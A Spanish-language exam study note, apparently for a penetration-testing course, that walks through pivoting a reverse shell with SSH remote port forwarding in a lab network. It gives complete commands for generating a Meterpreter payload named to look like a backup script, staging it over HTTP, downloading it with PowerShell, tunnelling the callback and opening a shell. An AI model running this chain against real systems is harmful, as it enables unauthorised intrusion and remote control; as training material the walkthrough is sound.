
## 1. Concepto

La **redirección remota de puertos SSH (**`**-R**`**)** permite que un servicio que se ejecuta en nuestro equipo atacante sea accesible desde una máquina remota a través de un host pivote.

Es especialmente útil cuando un objetivo puede conectarse al host pivote, pero **no tiene una ruta directa hacia nuestra máquina atacante**.

### Tipos de redirección SSH

|Opción|Tipo|Función|
|---|---|---|
|`-L`|Local Port Forwarding|Redirige un puerto local hacia un servicio remoto.|
|`-D`|Dynamic Port Forwarding|Crea un proxy SOCKS para acceder a una red remota.|
|`-R`|Remote Port Forwarding|Permite redirigir conexiones recibidas en el host remoto hacia un servicio accesible desde nuestro equipo local.|

## 2. Escenario de pivoting

Topología utilizada en el laboratorio:

|Máquina|Dirección IP|Función|
|---|---|---|
|Atacante|`10.10.15.5`|Ejecuta Metasploit y recibe la conexión inversa.|
|Ubuntu|`172.16.5.129`|Host pivote con acceso a ambas redes.|
|Windows A|`172.16.5.19`|Objetivo accesible por RDP.|

El problema es que Windows A solo puede comunicarse con la red interna `172.16.5.0/23` y no dispone de una ruta directa hacia la red del atacante.

Por tanto, una reverse shell que intente conectarse directamente a la IP del atacante no funcionará necesariamente.

**Solución:** utilizar Ubuntu como pivote y redirigir la conexión inversa desde el puerto `8080` de Ubuntu hasta el puerto `8000` del atacante.

## 3. Crear el payload con msfvenom

Generamos un ejecutable de Windows x64 con un payload Meterpreter HTTPS que se conectará a la IP interna del pivote.

```
msfvenom -p windows/x64/meterpreter/reverse_https \
lhost=<IP_INTERNA_PIVOTE> \
LPORT=8080 \
-f exe \
-o backupscript.exe
```

En este escenario:

- `lhost`: IP de Ubuntu accesible desde Windows A (`172.16.5.129`).
    
- `LPORT`: puerto `8080` de Ubuntu.
    
- `-f exe`: genera un ejecutable de Windows.
    
- `-o backupscript.exe`: guarda el payload en ese archivo.
    

**Importante:** el payload apunta a Ubuntu, no directamente a la IP del atacante.

## 4. Configurar el listener de Metasploit

En nuestra máquina atacante, iniciamos el handler:

```
msfconsole
```

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

El listener queda esperando conexiones en el puerto `8000`.

|Parámetro|Valor|
|---|---|
|Payload|`windows/x64/meterpreter/reverse_https`|
|LHOST|`0.0.0.0`|
|LPORT|`8000`|

El valor `0.0.0.0` permite que el handler escuche en todas las interfaces locales disponibles.

## 5. Transferir el payload al host pivote

Desde el atacante, copiamos el ejecutable al servidor Ubuntu mediante SCP:

```
scp backupscript.exe ubuntu@<IP_UBUNTU>:~/
```

Después, nos conectamos a Ubuntu y levantamos un servidor HTTP de Python desde el directorio donde se encuentra el archivo:

```
python3 -m http.server 8123
```

El servidor HTTP permite que Windows descargue el payload a través de la red interna.

## 6. Descargar el payload en Windows

Desde una consola PowerShell del objetivo Windows:

```
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Esto descarga el archivo desde el servidor HTTP de Ubuntu y lo guarda en `C:\backupscript.exe`.

En este punto tenemos:

- El payload generado en el atacante.
    
- El payload transferido a Ubuntu.
    
- El servidor HTTP de Ubuntu sirviendo el archivo.
    
- El payload descargado en Windows.
    
- El handler de Metasploit escuchando en el puerto `8000` del atacante.
    

## 7. Crear la redirección remota SSH con `-R`

Este es el paso principal.

Desde el atacante, ejecutamos:

```
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<IP_UBUNTU> -vN
```

### Significado de los parámetros

|Parámetro|Función|
|---|---|
|`-R`|Crea una redirección remota de puertos.|
|`172.16.5.129:8080`|IP y puerto en los que Ubuntu escucha las conexiones reenviadas.|
|`0.0.0.0:8000`|Dirección y puerto del lado del cliente SSH a los que se reenvían las conexiones; en este escenario, el listener del atacante.|
|`ubuntu@<IP_UBUNTU>`|Usuario y servidor SSH del pivote.|
|`-v`|Muestra información detallada de la conexión SSH.|
|`-N`|No ejecuta una shell remota; mantiene únicamente el túnel.|

### Flujo de la conexión

```
Windows A
172.16.5.19
     |
     | Conexión inversa al puerto 8080
     v
Ubuntu — Host pivote
172.16.5.129:8080
     |
     | Túnel SSH -R
     v
Atacante
127.0.0.1:8000
     |
     v
Metasploit multi/handler
```

La conexión llega al atacante a través del túnel SSH. Por ello, Metasploit puede mostrar que la conexión procede de `127.0.0.1` en lugar de mostrar directamente la IP de Windows.

**Diferencia fundamental:** con `-L` se suele acceder desde el atacante a un servicio remoto; con `-R` se permite que una conexión recibida en el lado remoto se reenvíe hacia un servicio accesible desde el cliente SSH.

## 8. Ejecutar el payload y recibir Meterpreter

Una vez establecido el túnel SSH y con el handler activo, ejecutamos el payload en Windows:

```
C:\backupscript.exe
```

Si la configuración es correcta y el payload se ejecuta satisfactoriamente, Metasploit debería recibir la conexión y abrir una sesión Meterpreter.

Ejemplo de salida:

```
[*] Meterpreter session 1 opened
```

Podemos acceder a una shell de Windows desde Meterpreter:

```
meterpreter > shell
```

La shell permite interactuar con el sistema Windows desde nuestra máquina atacante.

## 9. Verificar el funcionamiento

### En el host pivote

Con la opción `-v`, SSH muestra mensajes relacionados con las conexiones reenviadas.

Por ejemplo:

```
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress
debug1: channel 1: connected to 0.0.0.0 port 8000
```

Estos mensajes indican que SSH ha recibido una conexión en el puerto remoto y está intentando reenviarla al puerto configurado en el lado del cliente SSH.

### En Metasploit

Debemos comprobar que:

- El handler está escuchando en el puerto `8000`.
    
- El payload utiliza el mismo tipo de conexión que el handler.
    
- El túnel SSH está activo.
    
- Windows puede alcanzar el puerto `8080` de Ubuntu.
    
- El payload se ejecuta y se recibe una sesión Meterpreter.
    

## 10. Errores que conviene revisar

|Problema|Qué comprobar|
|---|---|
|No llega ninguna conexión|Que el payload apunte a la IP interna y al puerto correcto de Ubuntu.|
|El túnel SSH no funciona|Que las credenciales SSH sean correctas y que el servidor permita la redirección remota.|
|No se puede descargar el ejecutable|Que el servidor HTTP esté activo en Ubuntu, en el directorio correcto y en el puerto `8123`.|
|Metasploit no recibe la sesión|Que el handler y el payload utilicen el mismo tipo de payload y que el puerto configurado coincida.|
|El puerto remoto no queda disponible|Revisar la IP de escucha, las restricciones de `AllowTcpForwarding` y `GatewayPorts` del servidor SSH, si procede.|
|Se recibe una conexión, pero no se abre la sesión|Revisar los mensajes del handler, la ejecución del payload y las restricciones de seguridad del objetivo.|

## 11. Flujo de trabajo para el laboratorio

1. Identificar un host pivote con acceso tanto al atacante como a la red interna.
    
2. Generar un payload cuyo destino sea la IP interna del pivote.
    
3. Configurar Metasploit para escuchar en el puerto local `8000`.
    
4. Transferir el payload a Ubuntu mediante SCP.
    
5. Levantar un servidor HTTP en Ubuntu, por ejemplo, en el puerto `8123`.
    
6. Descargar el ejecutable desde Windows mediante PowerShell.
    
7. Establecer el túnel SSH remoto con `-R`.
    
8. Ejecutar el payload en Windows.
    
9. Verificar que Metasploit recibe la conexión y abre una sesión Meterpreter.
    

## Puntos clave para el examen

- `**ssh -R**` permite reenviar conexiones desde el lado remoto hacia un servicio accesible desde el cliente SSH.
    
- El host pivote actúa como intermediario cuando el objetivo no puede alcanzar directamente al atacante.
    
- El payload debe apuntar a la IP y al puerto del pivote que recibirá la conexión inversa.
    
- El puerto de escucha del pivote (`8080`) y el puerto del handler del atacante (`8000`) no tienen por qué ser iguales.
    
- `-N` evita abrir una shell remota; `-v` permite observar los detalles del túnel.
    
- La transferencia del ejecutable y el establecimiento del túnel son pasos diferentes: el servidor HTTP facilita la descarga, mientras que SSH reenvía la conexión inversa.
    
- La conexión puede aparecer como procedente de `127.0.0.1` en Metasploit porque el tráfico llega a través del túnel SSH.
    
- Tener acceso por RDP no implica que el objetivo pueda establecer conexiones directas hacia cualquier red.
